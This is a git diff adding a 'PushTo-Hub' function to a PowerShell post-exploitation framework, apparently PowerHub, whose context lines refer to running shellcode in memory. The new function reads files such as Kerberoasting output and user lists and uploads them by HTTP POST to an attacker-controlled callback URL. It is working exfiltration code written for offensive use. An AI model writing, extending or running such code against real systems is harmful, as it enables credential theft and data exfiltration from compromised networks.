@@ -288,6 +288,44 @@ Execute the shellcode module 47 in memory
 }
 
 
+function PushTo-Hub {
+<#
+.SYNOPSIS
+
+Uploads files back to the hub via Cmdlet.
+
+.EXAMPLE
+
+PushTo-Hub kerberoast.txt, users.txt
+
+Description
+-----------
+Upload the files 'kerberoast.txt' and 'users.txt' via HTTP back to the hub.
+#>
+    Param(
+       [Parameter(Mandatory=$True)]
+       [String[]]$Files,
+    )
+
+    ForEach ($file in $Files) {
+        $fileBin = [System.IO.File]::ReadAllBytes($file)
+        $enc = [System.Text.Encoding]::GetEncoding("iso-8859-1")
+        $fileEnc = $enc.GetString($fileBin)
+
+        $boundary = [System.Guid]::NewGuid().ToString()
+        $LF = "`r`n"
+
+        $bodyLines = (
+            "--$boundary",
+            "Content-Disposition: form-data; name=`"file`"; filename=`"$file`"",
+            "Content-Type: application/octet-stream$LF",
+            $fileEnc,
+            "--$boundary--$LF"
+        ) -join $LF
+
+        $response = Invoke-RestMethod -Uri $CALLBACK_URL -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
+    }
+}
 
 function Help-PowerHub {
     Write-Host @"
@@ -296,9 +334,11 @@ The following functions are available:
   * Load-HubModule
   * Run-Exe
   * Run-Shellcode
+  * PushTo-Hub
 
 Use 'Get-Help' to learn more about those functions.
 "@
 }
+
 
 
